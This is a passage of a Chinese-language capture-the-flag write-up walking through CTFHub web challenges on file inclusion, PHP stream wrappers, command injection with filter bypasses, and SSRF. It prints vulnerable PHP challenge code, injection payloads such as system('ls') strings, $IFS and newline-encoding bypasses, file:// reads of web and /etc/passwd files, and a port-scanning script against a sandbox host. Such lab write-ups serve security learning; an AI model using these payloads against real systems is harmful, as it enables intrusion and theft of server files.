class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (isset($_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    if (!strpos($_GET[&quot;file&quot;], &quot;flag&quot;)) &#123;</span><br><span class="line">        include $_GET[&quot;file&quot;];</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Hacker!!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><blockquote><ol><li><code>&lt;?php</code>: 这是 PHP 的开头标签，表示接下来的代码是 PHP 代码。</li><li><code>error_reporting(0);</code>: 这行代码关闭了所有的 PHP 错误报告。<code>error_reporting</code> 是一个函数，用于设置错误报告的级别。在这里，<code>0</code> 表示关闭所有错误报告。</li><li><code>if (isset($_GET['file'])) &#123;</code>: 使用 <code>isset()</code> 函数检查是否有一个名为 <code>file</code> 的 GET 参数被传递。</li><li><code>if (!strpos($_GET[&quot;file&quot;], &quot;flag&quot;)) &#123;</code>: 使用 <code>strpos()</code> 函数检查 <code>file</code> 参数中是否包含子字符串 “flag”。如果 <code>file</code> 参数中不包含 “flag”，则执行下一行代码。</li><li><code>include $_GET[&quot;file&quot;];</code>: 使用 <code>include</code> 语句包含并执行从 <code>file</code> 参数中获取的文件。这意味着如果用户通过 URL 传递一个 PHP 文件的路径（例如 <code>example.php?file=somefile.php</code>），那么 <code>somefile.php</code> 会被包含并执行。</li><li><code>&#125; else &#123;</code>: 如果 <code>file</code> 参数中包含 “flag”，则执行此处的代码。</li><li><code>echo &quot;Hacker!!!&quot;;</code>: 输出 “Hacker!!!” 给用户。这可能是一个警告消息，表明用户试图访问一个不允许的文件或进行某种不安全的操作。</li><li><code>&#125;</code>: 结束 <code>else</code> 语句块。</li><li><code>&#125;</code>: 结束外部的 <code>if</code> 语句块。</li><li><code>else &#123;</code>: 如果用户没有传递 <code>file</code> 参数，则执行此处的代码。</li><li><code>highlight_file(__FILE__);</code>: 使用 <code>highlight_file()</code> 函数来输出当前文件的源代码，并高亮其中的 PHP 代码。<code>__FILE__</code> 是一个魔术常量，表示当前文件的完整路径和文件名。</li><li><code>&#125;</code>: 结束外部的 <code>if-else</code> 语句块。</li><li><code>?&gt;</code>: PHP 的结尾标签，表示 PHP 代码的结束。</li></ol></blockquote><p>简单来说，就是url路径如果有file的参数，看参数里面有没有字符串flag，如果有则返回Hacker，没有的话则执行file指定文件</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/11.png" alt=""></p><p>其实它就是利用了服务器中本来就存在的一个文件，在get中引用就可以成为一个注入点，然后去输入命令就可以啦！</p><p>shell.txt文件其实就是小马</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/6.png" alt=""></p><p>这里也是三个方法</p><h6 id="1-HackBar">1.HackBar</h6><p>先在url里面的file的参数指向shell文件</p><p>在添加POST数据，即payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub=system(&quot;ls&quot;); #ctfhub是密码</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/7.png" alt=""></p><p>然后老样子先找<code>flag</code>，再用<code>cat</code>获取文件内容就行了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/8.png" alt=""></p><h6 id="2-蚁剑-2">2.蚁剑</h6><p>记得url是shell文件位置，密码是<code>ctfhub</code>,添加链接就行了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/9.png" alt=""></p><p>HackBar传数据的时候抓的包</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/10.png" alt=""></p><h5 id="3-php-input">3.php://input</h5><p>我刚看到这题一点头绪都没有</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/13.png" alt=""></p><p>主要看不懂题目php://input是什么意思，看了很多writeup才知道PHP伪协议</p><table><thead><tr><th>协议</th><th>作用</th></tr></thead><tbody><tr><td>php://input</td><td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</td></tr><tr><td>php://output</td><td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td></tr><tr><td>php://fd</td><td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td></tr><tr><td>php://memory php://temp</td><td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td></tr><tr><td>php://filter</td><td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td></tr></tbody></table><p><a href="https://segmentfault.com/a/1190000018991087">PHP伪协议总结 - 个人文章 - SegmentFault 思否</a></p><p><a href="https://www.php.net/manual/zh/wrappers.php.php#refsect2-wrappers.php-unknown-unknown-unknown-descriptioq">PHP: php:// - Manual</a></p><p><a href="https://www.cnblogs.com/zzjdbk/p/13030717.html">php伪协议总结 - My_Dreams - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/cosmoslin/article/details/120695429">PHP伪协议详解-CSDN博客</a></p><p>我这里就对这题进行总结：</p><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p><p><strong>php://input</strong> 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。</p><p>设置需要下面两个开启</p><blockquote><p>allow_url_fopen 它决定了 PHP 是否允许打开远程文件。当 <code>allow_url_fopen</code> 设置为 <code>on</code> 时，PHP 允许使用 URL 打开文件，这意味着你可以使用 <code>fopen()</code>、<code>file_get_contents()</code> 和其他相关函数从远程服务器上读取文件。</p><p>allow_url_fopen ：off/on</p><p>allow_url_include其决定了是否允许使用 URL 路径来包含文件。如果 <code>allow_url_include</code> 设置为 <code>on</code>，则可以使用 URL 来包含远程文件。这意味着，在 PHP 脚本中，你可以使用类似 <code>include 'http://example.com/file.php'</code> 的语句来包含远程文件。</p><p>allow_url_include：on</p></blockquote><p>他提供了phpinfo文件供我们查看</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/12.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/15.png" alt=""></p><p>然后我们只需要去用burp抓包的同时上传执行的php指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;ls&quot;); ?&gt;</span><br></pre></td></tr></table></figure><p>后面指令以此类推</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/16.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/17.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/18.png" alt=""></p><h5 id="4-读取源代码">4.读取源代码</h5><p>和上题一样设计PHP伪协议</p><p>但是这次却不能用php://input 了，可能是phpinfo()中allow_url_fopen没有开启，导致不能使用php://input</p><p>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p><p>简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。</p><p>php://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。</p><p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p><table><thead><tr><th>php://filter 参数</th><th>描述</th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td>必须项。它指定了你要筛选过滤的数据流。</td></tr><tr><td>read=&lt;读链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（`</td></tr><tr><td>write=&lt;写链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（`</td></tr><tr><td>&lt;; 两个链的过滤器&gt;</td><td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table><p>因为题目直接告诉我们flag的位置是<code>/flag</code></p><p>直接输入位置就行了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/resource=/flag</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/20.png" alt=""></p><p>网上很多都是先base64先编码（用我第一种就行了）</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/21.png" alt=""></p><p>在解码（用HackBar里面的Encoding功能）</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/22.png" alt=""></p><h5 id="5-远程包含">5.远程包含</h5><blockquote><p>在PHP的配置文件php.ini里将allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p></blockquote><p>有两种方法</p><p>1.php://input</p><p>我看了一下配置文件两个参数都开启着，可以用php://input(又是看不懂题目的一天)，和php://input步骤一样</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/23.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/24.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/25.png" alt=""></p><p>2.访问文件</p><p>即通过后面添加包含一句话小马的文件的地址，这里需要使用vps或者与服务器，通过url访问你的文件位置，本人懒得试了，看了这篇题解就算了。。。</p><p><a href="https://blog.csdn.net/jiuyongpinyin/article/details/113180160?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-4.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-4.control">ctf远程文件包含</a></p><h5 id="6-命令注入">6.命令注入</h5><blockquote><p>这是一个在线测试网络延迟的平台，路由器中经常会见到。无任何安全措施，尝试获取 flag</p></blockquote><p>先了解一下命令注入</p><blockquote><p>后台直接执行系统命，一般要结合linux,windows的管道对要执行的命令进行拼接。 过滤的话大致分为两种情况：白名单，黑名单<br>黑名单是过滤到一些常用的参数，如果过滤的不全面可以考虑用其他相同功能的函数代替；如果黑名单比较全面，那就要考虑用编码的方式尝试绕过。<br>白名单是限制参数的使用范围，写死了的话应该常规的办法就没有用了。盲猜很多web都是基于白名单的。<br>可以通过echo,&gt;&gt;等方法生成php文件并写入一句话木马</p></blockquote><p>先分析代码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这里，<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>] 是从 URL 的 GET 参数中获取的 IP 地址。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果这个参数存在并且不为空，那么就会执行 <span class="built_in">exec</span>(<span class="variable">$cmd</span>, <span class="variable">$res</span>) 函数，其中 <span class="variable">$cmd</span> 是构造的 ping 命令，<span class="variable">$res</span> 是一个数组用于存储命令的输出。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">exec</span>() 函数会执行该命令，并返回最后一个行的输出，或者在出现错误时返回 <span class="literal">false</span>。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">exec</span>() 函数通常用于执行系统命令、运行脚本或执行其他需要外部程序的操作。它可以与操作系统交互，允许在 PHP 脚本中执行系统级别的操作。它允许执行任意命令。如果未对用户输入进行适当的验证和过滤，可能会导致安全漏洞</span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">res = FALSE;</span></span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $cmd = &quot;ping -c 4 &#123;$_GET[&#x27;ip&#x27;]&#125;&quot;;</span><br><span class="line">    exec($cmd, $res);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="variable">$res</span> 变量是否存在。如果存在，它就会打印出 <span class="variable">$res</span> 的内容，也就是 ping 命令的输出。</span></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">if ($res) &#123;</span><br><span class="line">    print_r($res);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这行代码会显示当前 PHP 文件的源代码。这通常用于调试目的，但在生产环境中可能存在安全风险。</span></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>总而言之就是会执行空格的所有指令</p><p>这题没有什么限制，直接用命令就行了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/26.png" alt=""></p><p>值得注意的是<code>cat</code>文件的时候因为用了注释符不会显示在页面里面，但是可以读源码（网上很多方法是把内容先base64编码这样就可以看到了，在解码就是flag，但是没必要，这里提一嘴）</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/27.png" alt=""></p><h5 id="7-过滤cat">7.过滤cat</h5><p>看源码就知道屏蔽了cat</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/28.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/29.png" alt=""></p><p>主要有两个思路，要么找一个代替cat有相同功能的指令，要么插入特殊符号绕过cat</p><h6 id="1-替换cat">1.替换cat</h6><blockquote><p>linux查看文本的命令</p><p>cat 由第一行开始显示内容，并将所有内容输出<br>tac 从最后一行倒序显示内容，并将所有内容输出<br>more 根据窗口大小，一页一页的现实文件内容<br>less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符<br>head 只显示头几行<br>tail 只显示最后几行<br>nl 类似于cat -n，显示时输出行号<br>tailf 类似于tail -f<br>这里我使用的是tac来查看文件</p></blockquote><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/32.png" alt=""></p><p>2.连接符绕过</p><p>连接符<code>''</code>、<code>\</code>或<code>$@</code>来绕过过滤</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/30.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/31.png" alt=""></p><h5 id="8-过滤空格">8.过滤空格</h5><p>空格可以用以下字符串代替：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 $&#123;IFS&#125;、$IFS等</span><br></pre></td></tr></table></figure><p><code>$IFS</code>在linux下表示分隔符，但是如果单纯的<code>cat$IFS2</code>,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个<code>$</code>可以起到截断的作用，但是为什么要用<code>$9</code>呢，因为<code>$9</code>只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/33.png" alt=""></p><h5 id="9-过滤目录分隔符">9.过滤目录分隔符</h5><p>我不知道对我有什么影响，我本来就没有用’/’</p><p>这里先用ls命令看到了flag在<code>flag_is_here</code>文件夹里面</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/34.png" alt=""></p><p>我们用<code>cd</code>进入这个文件夹（<code>;</code>可以执行所有指令)</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/35.png" alt=""></p><p>没有压力好吧🤗</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/36.png" alt=""></p><h5 id="10-过滤运算符">10.过滤运算符</h5><p>他只是把’&amp;‘过滤了，但是我们还能用’;',过程都一样我就少截几张图</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/37.png" alt=""></p><h5 id="11-综合过滤练习">11.综合过滤练习</h5><p>这次基本能用的都过滤了😥</p><p>没办法，又去看writeup了</p><p><a href="https://blog.csdn.net/weixin_44732566/article/details/104731855">CTFHub 技能树 综合过滤-CSDN博客</a></p><p>原来还有url编码一说（可恶忘记了）</p><blockquote><p>url编码中，%0a是换行符，%0d是回车符，可以用这两个进行命令拼接。</p><p>用<code>$&#123;IFS&#125;</code>取代空格，用<code>$*</code>（其他连接符也行）绕过关键词过滤，因为在没有定义的情况下，<code>$*</code>在shell命令执行下为空</p></blockquote><p>注意不是在ip的空格里面写，因为在url里面会二次编码</p><p>比如说<code>1%0als</code>在url会变成<code>1%250als</code></p><blockquote><p>这里<code>ls</code>是对flag_is_here目录进行操作，所有ls 是在cd flag_is_here执行后在flag_is_here目录下执行，这里拼接的就得用%0a换行符，可以等效&amp;&amp;，不能用%0d,%0d等效于&amp;。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1%0D%0Acd$&#123;IFS&#125;fl$*ag_is_here%0Als</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/38.png" alt=""></p><p>然后再tac（或者其他命令）获取flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1%0D%0Acd$&#123;IFS&#125;fl$*ag_is_here%0Atac$&#123;IFS&#125;fl$*ag_39312362329318.php</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/39.png" alt=""></p><p>还有一种方法我个人认为挺复杂的是利用16进制编码</p><p><a href="https://www.cnblogs.com/anweilx/p/12512681.html">ctfhub技能树—RCE—综合过滤练习 - anweilx - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/bmth666/article/details/104836708">CTFHub之web基础刷题记录(续集)_hidden ctfhub-CSDN博客</a></p><h4 id="7-SSRF">7.SSRF</h4><p>SSRF(Server-Side Request Forgery：服务器跨站请求),是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p><p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内网。也就是说可以利用一个网络请求的服务，当作跳板进行攻击）</p><p>攻击者利用了可访问Web服务器（A）的特定功能 构造恶意payload；攻击者在访问A时，利用A的特定功能构造特殊payload，由A发起对内部网络中系统B（内网隔离，外部不可访问）的请求，从而获取敏感信息。<strong>此时A被作为中间人（跳板）进行利用。</strong></p><p>例如</p><ul><li><code>/secret.php</code> 是外网无法访问的</li><li><code>http://xxx.xxx/?url=http://127.0.0.1/example.php</code>，该链接会使用curl构造请求，访问<code>/var/www/html/secret.php</code>文件，如果配置不当，就可以利用GET参数<code>url</code>，构造请求访问内网资源</li><li>假如内网的3000端口有管理系统，则可以通过<code>?url=http://127.0.0.1:3000</code>进行访问</li></ul><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/1.png" alt=""></p><p>1.SSRF产生的原因</p><p>很多web应用都提供了从其他的服务器上获取数据的功能。使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地的服务器</p><p>SSRF 形成的原因往往是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。<br>如：从指定URL地址获取网页文本内容，加载指定地址的图片，下载等。利用的就是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p><p>2.利用SSRF可以实现的攻击</p><ul><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner 信息</li><li>攻击运行在内网或本地的应用程序</li><li>对内网 WEB 应用进行指纹识别，通过访问默认文件实现(如：readme文件)</li><li>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(如：Struts2，sqli)</li><li>下载内网资源(如：利用file协议读取本地文件等)</li><li>进行跳板</li><li>无视cdn</li><li>利用Redis未授权访问，HTTP CRLF注入实现getshell</li></ul><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/2.png" alt=""></p><p>需要了解的伪协议</p><blockquote><p>file:// 协议<br>作用：<br>用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。</p><p>http/s协议<br>作用：<br>探测内网主机存活、端口开放情况，可以通过访问其它网站确定存活</p><p>dict协议<br>作用：<br>字典服务器协议，访问字典资源，查看端口，操作内网redis访问等</p><p>Gopher协议<br>作用：<br>Gopher协议可以说是SSRF中的万金油。利用此协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp等等，也可以发送 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。</p></blockquote><p><a href="https://blog.csdn.net/qq_45927266/article/details/119897878">SSRF 漏洞学习</a></p><h5 id="1-内网访问">1.内网访问</h5><blockquote><p>尝试访问位于127.0.0.1的flag.php吧</p></blockquote><p>这题应该是为了让我们最直观的看SSRF吧，首先进去发现空白，f12看源码也是如此</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/3.png" alt=""></p><p>然后看了眼url，应该是修改参数，这里直接添加</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url=127.0.0.1/flag.php</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">127.0.0.1就是localhost，访问本地</span></span><br></pre></td></tr></table></figure><p>就能获取flag.php，我的理解就是由合法访问的A发起对内部的访问获取资源（外网访问不了内网）</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/4.png" alt=""></p><h5 id="2-伪协议读取文件">2.伪协议读取文件</h5><blockquote><p>尝试去读取一下Web目录下的flag.php吧</p></blockquote><h6 id="0-知识前提">0.知识前提</h6><p>1.伪协议：事实上是其支持的协议与封装协议。而其支持的部分协议有：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line"></span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line"></span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line"></span><br><span class="line">php:// — 访问各个输入/输出流(I/O streams)</span><br></pre></td></tr></table></figure><p>2.一般在linux服务器的web目录是/var/www/html</p><p>1.网站的目录一般都在/var/www/html/，我们由此构造payload：需要打开f12看源码，这里html没有显示是因为注释了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/5.png" alt=""></p><p>这里提一嘴，可以看的文件不仅如此，更可以查看etc/passwd文件，所以知道漏洞的危险了吧😏</p><blockquote><p>/etc/passwd是一个按行记录的文本文件，每行记录一个用户的信息。每行信息内容以6个“：”分隔为7个部分，从左到右依次为用户的名称、登录口令情况、用户ID、所属组ID、用户的全称等其它详细信息、用户的home目录以及用户的默认登录shell。</p></blockquote><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/6.png" alt=""></p><h5 id="3-端口扫描">3.端口扫描</h5><blockquote><p>来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦</p></blockquote><p>就是暴力一个一个找，这里有两个方法</p><p>1.burp</p><p>使用Intruder模块经行爆破，记得在爆破点进行add</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/7.png" alt=""></p><p>然后就是去payload进行参数的设置</p><p>第一个是类型，选择数字</p><p>选择连续还是随机，选sequential</p><p>from 8000</p><p>to 9000</p><p>step：间隔为1</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/8.png" alt=""></p><p>然后启动attack，看长度，一般最长或最短，点击length可以排序</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/9.png" alt=""></p><p>去端口访问就行了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/10.png" alt=""></p><p>2.python脚本</p><p>代码我就先放这里，记得修改url</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">url = &#x27;http://challenge-3fca5c04aaab9eb9.sandbox.ctfhub.com:10800/?url=127.0.0.1:&#x27;</span><br><span class="line">for index in range(8000, 9001):</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">f-string（格式化字符串字面值）</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">url_1=f<span class="string">&quot;http://challenge-3fca5c04aaab9eb9.sandbox.ctfhub.com:10800/?url=127.0.0.1:&#123;index&#125;&quot;</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">url_1=<span class="string">&quot;http://challenge-3fca5c04aaab9eb9.sandbox.ctfhub.com:10800/?url=127.0.0.1:&#123;&#125;&quot;</span>.format(index)</span></span><br><span class="line">    url_1 = url + str(index)</span><br><span class="line">    res = requests.get(url_1)</span><br><span class="line">    print(index, res.text)</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/11.png" alt=""></p><h5 id="4-POST请求">4.POST请求</h5><blockquote><p>这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</p></blockquote><p>前几题还是正常（我认为），这题我是真懵了，看writeup也是看了很久才了解一些</p><p><s>所以说代码审计真的很重要</s></p><p>首先需要知道Gopher协议和curl</p><p><a href="https://zhuanlan.zhihu.com/p/112055947">Gopher协议在SSRF漏洞中的深入研究</a></p><p><a href="https://www.cnblogs.com/lxj0205/p/9360826.html">PHP使用CURL详解 </a></p><h6 